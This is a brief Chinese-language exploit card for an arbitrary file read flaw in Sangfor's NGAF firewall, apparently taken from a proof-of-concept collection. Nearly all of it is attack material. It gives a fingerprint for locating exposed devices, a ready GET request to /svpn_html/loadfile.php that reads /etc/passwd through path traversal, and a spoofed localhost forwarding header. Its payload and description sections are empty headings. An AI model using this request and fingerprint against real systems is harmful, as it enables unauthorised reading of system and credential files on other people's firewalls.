# 深信服下一代防火墙NGAFloadfile存在任意文件读取漏洞

- **系统**：深信服　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="SANGFOR | NGAF"`
- **请求**：`GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`y-forwarded-for: 127.0.0.1`

**请求体 / payload**
```

```

**其他**
- 深信服下一代防火墙NGAF loadfile存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 深信服下一代防火墙NGAF